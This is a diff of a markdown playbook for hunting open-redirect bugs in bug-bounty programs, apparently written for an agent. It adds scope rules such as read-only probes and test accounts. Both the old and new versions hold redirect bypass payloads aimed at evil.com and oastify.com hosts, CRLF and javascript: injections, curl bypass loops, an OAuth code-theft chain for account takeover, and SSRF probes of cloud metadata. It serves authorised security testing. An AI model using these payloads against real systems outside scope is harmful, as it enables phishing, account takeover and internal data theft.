@@ -7,175 +7,112 @@ report_count: 28
 
 # HUNT-OPEN-REDIRECT — Open Redirect
 
-## Crown Jewel Targets
+Standalone open redirect is **Low** on most programs. It **pays** when a trusted-origin redirect becomes OAuth `redirect_uri`, token/Referer leak, SSRF follow, or header injection.
 
-Open redirect alone is Low. Chained to OAuth = Critical (ATO).
+## Rails
+- In-scope only. Send victims to **your** OOB host, never a third-party live site.
+- Read-only probes (`HEAD`/`GET` with `--max-redirs 0`) by default. State-changing login/OAuth chains only with test accounts.
+- One proof URL per sink. No mass-phishing.
+- STOP at draft. Do not report location-echo without a **browser** follow (server parse ≠ browser parse).
 
-**Highest-value chains:**
-- **Open redirect → OAuth auth code theft** — redirect_uri contains open redirect on trusted domain → auth code sent to attacker → ATO
-- **Open redirect → phishing** — users trust the URL because it starts with target.com
-- **Open redirect → SSRF escalation** — if redirect followed server-side → SSRF
-- **Open redirect → session fixation** — force user to login endpoint with pre-set session
+## Decision tree
+1. Collect sinks: query params, path prefixes, POST `return`, JSON `redirectUrl`, `Location`/`Refresh` headers, JS `location`/`window.open`, meta refresh, mobile deep links, OAuth `redirect_uri`/`RelayState`.
+2. For each sink, try the bypass table until `Location` (or JS) points at **your** registerable host **and** a real browser navigates there.
+3. If yes: **chain immediately** — is this host/path in an OAuth allowlist? Does a server-side fetcher follow it? Does a token ride the URL?
+4. If the server accepts but the browser **stays on-target** (userinfo/`@` after first `/`) → **not** ATO. See `hunt-oauth` browser-vs-server table.
 
----
-
-## Attack Surface Signals
-
+## Surface
 ```
-?redirect=
-?next=
-?url=
-?return=
-?returnTo=
-?continue=
-?dest=
-?destination=
-?go=
-?forward=
-?location=
-?target=
-?redir=
-?redirect_uri=
-?callback=
-?checkout_url=
-?success_url=
-?cancel_url=
-/logout?returnTo=
-/login?next=
-/sso?callback=
+redirect next url return returnTo continue dest destination go forward
+location target redir redirect_uri callback checkout_url success_url cancel_url
+RelayState loginHint returnUrl r u to jump out link
+/logout?returnTo=  /login?next=  /sso?callback=
 ```
 
----
+## Bypass table (copy-paste)
 
-## Bypass Table
+| Class | Payload | Notes |
+|---|---|---|
+| Basic | `https://UNIQUE.oastify.com` | Always first |
+| Protocol-relative | `//UNIQUE.oastify.com` | Common allowlist miss |
+| Backslash | `/\UNIQUE.oastify.com` `\/\/UNIQUE.oastify.com` `/\\UNIQUE.oastify.com` | IIS/Tomcat/`\`→`/` |
+| Userinfo | `https://target.com@UNIQUE.oastify.com` | Works **only** if `@` is still in authority (before first `/`) |
+| Suffix host | `https://target.com.UNIQUE.oastify.com` | `startsWith` / unescaped `.` |
+| Encoded dot/slash | `https://target.com%2eUNIQUE.oastify.com` `%2f%2fUNIQUE.oastify.com` `%5cUNIQUE.oastify.com` | Double-encode `%252f` |
+| Null / whitespace | `https://UNIQUE.oastify.com%00.t.com` `%09` `%0a` `%0d` `%20` | Header/parser split |
+| CRLF header inject | `https://t.com%0d%0aLocation:%20https://UNIQUE.oastify.com` | Extra `Location` / XSS via injected header |
+| Fragment | `https://UNIQUE.oastify.com#.target.com` `https://UNIQUE.oastify.com%23.target.com` | Validator sees suffix |
+| Open-scheme | `https:UNIQUE.oastify.com` `//UNIQUE%2eoastify.com` | parse_url vs WHATWG |
+| Unicode slash | `https://UNIQUE.oastify.com／.target.com` `〱UNIQUE.oastify.com` | Normalization after check |
+| Regex `$` missing | `https://target.com.evil.com` | Prefix-only allowlist |
+| Trailing-dot origin | `https://target.com.` | Cookie/host confusion; sometimes allowlisted |
+| JS URI | `javascript:alert(1)` `javascript://target.com%0aalert(1)` | Often XSS, not redirect; still test |
+| Data URI | `data:text/html,<script>location='https://UNIQUE.oastify.com'</script>` | Rarely allowed |
+| DOM sink | `?next=` written to `location.href` / `location.replace` / `window.open` without parse | Client-only — confirm in browser |
+| Meta refresh | `<meta http-equiv=refresh content="0;url=...">` | HTML sink |
+| Nested param | `https://target.com/logout?next=https://UNIQUE.oastify.com` as the **inner** redirect_uri | OAuth chain |
 
-| Technique | Payload |
-|-----------|---------|
-| Basic | `https://evil.com` |
-| Protocol relative | `//evil.com` |
-| Backslash bypass | `/\\evil.com` |
-| At-sign confusion | `https://target.com@evil.com` |
-| Double slash | `//evil.com/%2F..` |
-| URL encoding | `%2Fevil.com` |
-| Null byte | `evil.com%00target.com` |
-| Whitespace | `evil.com%09` or `%20` |
-| JavaScript URI | `javascript:window.location='https://evil.com'` |
-| Data URI | `data:text/html,<script>window.location='https://evil.com'</script>` |
-| Subdomain | `https://target.com.evil.com` |
-| Fragment | `https://evil.com#.target.com` |
+**PHP `parse_url` vs browser:** `https://target.com:@UNIQUE.oastify.com` / `https://target.com#@UNIQUE.oastify.com` — server host=`target.com`, browser may go to attacker. Always **headless-check**.
 
----
-
-## Step-by-Step Hunting Methodology
-
-### Phase 1 — Discover Redirect Parameters
+## Methodology
 ```bash
-# Extract all redirect candidates from crawl
-cat recon/$TARGET/urls.txt | gf redirect > recon/$TARGET/redirect-candidates.txt
-wc -l recon/$TARGET/redirect-candidates.txt
+# 1) Discover
+grep -Eo '(\?|&)(redirect|next|url|return|returnTo|continue|dest|callback|RelayState|to)=' urls.txt
 
-# Less common param names
-grep -E "(\?|&)(return|next|dest|go|forward|location|to|jump|target|out|link|logout)" \
-  recon/$TARGET/urls.txt >> recon/$TARGET/redirect-candidates.txt
-```
+# 2) Non-follow probe — unique OOB per param
+curl -sI --max-redirs 0 "$URL" | grep -iE '^(HTTP|location|refresh):'
 
-### Phase 2 — Basic Test
-```bash
-COLLAB="https://evil.com"
-cat recon/$TARGET/redirect-candidates.txt | qsreplace "$COLLAB" | while read url; do
-  LOC=$(curl -s -I --max-redirs 0 "$url" | grep -i "^location:")
-  STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-redirs 0 "$url")
-  [ -n "$LOC" ] && echo "$STATUS | $LOC | $url"
+# 3) Bypass loop on one sink
+BASE="https://$TARGET/login?next="
+for P in \
+  'https://UNIQUE.oastify.com' '//UNIQUE.oastify.com' '/\UNIQUE.oastify.com' \
+  "https://$TARGET@UNIQUE.oastify.com" "https://$TARGET.UNIQUE.oastify.com" \
+  'https://UNIQUE.oastify.com%23.t' '%2f%2fUNIQUE.oastify.com'; do
+  echo "== $P"; curl -sI --max-redirs 0 "${BASE}${P}" | grep -i '^location:'
 done
 ```
 
-### Phase 3 — Bypass Techniques
-```bash
-BASE_URL="https://$TARGET/redirect?url="
-PAYLOADS=(
-  "https://evil.com"
-  "//evil.com"
-  "/\\evil.com"
-  "https://$TARGET@evil.com"
-  "https://evil.com%23.$TARGET"
-  "https://evil.com%09"
-)
-for P in "${PAYLOADS[@]}"; do
-  LOC=$(curl -s -I --max-redirs 0 "${BASE_URL}${P}" | grep -i "^location:")
-  echo "$P → $LOC"
-done
+**Browser proof (mandatory for High/ATO):** Playwright/real browser: final `document.location.origin` must be your host. Server `Location` to attacker + browser staying on-target = not exploitable.
+
+### OAuth chain (the money)
 ```
-
-### Phase 4 — OAuth Chain Test
-```bash
-# If target has OAuth, check if redirect_uri accepts open redirect
-grep -i "oauth\|authorize\|redirect_uri" recon/$TARGET/urls.txt | head -20
-
-# Construct OAuth URL with open redirect as redirect_uri
-# Normal: redirect_uri=https://target.com/callback
-# Attack: redirect_uri=https://target.com/redirect?url=https://evil.com
-OAUTH_URL="https://$TARGET/oauth/authorize"
-curl -sv "$OAUTH_URL?response_type=code&client_id=CLIENT_ID&redirect_uri=https://$TARGET/redirect%3Furl%3Dhttps%3A%2F%2Fevil.com" 2>&1 | grep -i "location:"
+1. Find an open redirect on a host/path the OAuth client allowlists
+2. redirect_uri=<that URL pointing at UNIQUE.oastify.com>
+3. Victim (test B) completes authorize
+4. code/token must HIT your OOB (log query string) → exchange as B
 ```
+If allowlist is exact-path, the redirect must sit **on that path** (path traversal / `?next=` on `/callback`). See `hunt-oauth`.
 
-### Phase 5 — Server-Side Redirect (SSRF escalation)
+### Server-side follow → SSRF
+If **the app** fetches the redirect target (webhook preview, link unfurl, “proxy”, oauth “validate uri”):
 ```bash
-# If the app fetches the redirect target server-side (302 fetch follow)
-curl -s "https://$TARGET/proxy?url=https://evil.com/redirect-to-169.254.169.254/latest/meta-data/"
-
-# Or: if app makes HTTP request to the redirect destination
-curl -s "https://$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/" \
-  -H "Cookie: $SESSION"
+curl -s "https://$TARGET/unfurl?url=http://UNIQUE.oastify.com"
+# then internal: http://127.0.0.1/ / 169.254.169.254 — unique marker in body
 ```
-
----
-
-## Automation
-```bash
-# openredirex
-pip3 install openredirex
-openredirex -l recon/$TARGET/redirect-candidates.txt -p evil.com
-
-# nuclei
-nuclei -u https://$TARGET -t redirect/ -severity medium,high
-
-# gf + qsreplace
-cat recon/$TARGET/urls.txt | gf redirect | qsreplace "https://evil.com" | \
-  xargs -I{} curl -s -o /dev/null -w "%{http_code} %{redirect_url}\n" --max-redirs 0 {}
-```
-
----
-
-## Chain Table
-
-| Open redirect finding | Chain to | Impact |
-|----------------------|----------|--------|
-| Any open redirect | OAuth redirect_uri bypass | Auth code theft → ATO |
-| Any open redirect | Phishing URL with target domain | Social engineering |
-| Server-side redirect | SSRF via followed redirect | Internal service access |
-| Logout redirect | Session fixation | Force login with known session |
-
----
+Hand confirmed SSRF to `hunt-ssrf`. Do not scan the cloud metadata tree.
 
 ## Validation
+- `Location`/`Refresh`/JS navigates to **your** unique host (browser, not curl-only).
+- **OAuth/ATO:** code or token **received** OOB and exchanged — not merely a 302 to evil.
+- **Phishing-only:** Low/Medium; many programs N/A it (`triage-validation` never-submit-standalone).
+- Header CRLF: prove extra header or body inject with unique marker, not a theoretical `%0d`.
+- One sink, one PoC. Do not dump 50 `qsreplace` hits.
 
-✅ Location header in response points to evil.com (your controlled domain)
-✅ Browser follows redirect to attacker-controlled page
+**Severity:** redirect alone = **Low**. + OAuth code theft = **High–Critical**. + SSRF data = **High**. + header inject XSS = per `hunt-xss`. Login `next=` phishing = **Low** unless program pays.
 
-**Severity:**
-- Redirect alone: Low (most programs)
-- Chains to OAuth code theft → ATO: High/Critical
-- Chains to phishing with brand name: Low-Medium
-- Server-side → SSRF: High
+## Chains
+| Redirect | Compose | Impact |
+|---|---|---|
+| Trusted-host redirect | OAuth `redirect_uri` | ATO (`hunt-oauth`) |
+| Logout `returnTo` | Session fixation (`hunt-session`) | Planted session |
+| Server-side follow | SSRF (`hunt-ssrf`) | Internal read |
+| Token in URL | Referer leak (`hunt-ato` Path 2) | Token theft |
+| CRLF in Location | Response-split / cache poison | XSS / cache |
 
-## Before you report — dedup gate
+Cross-refs: `hunt-oauth`, `hunt-ato`, `hunt-ssrf`, `hunt-host-header`, `hunt-csrf`, `triage-validation`.
 
-Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
-order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:
-
+## Dedup gate
 ```bash
 python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
 ```
-
-`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
-(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
+`NOVEL` → `/validate`. `LIKELY_DUP` → stop unless a concrete differentiator.
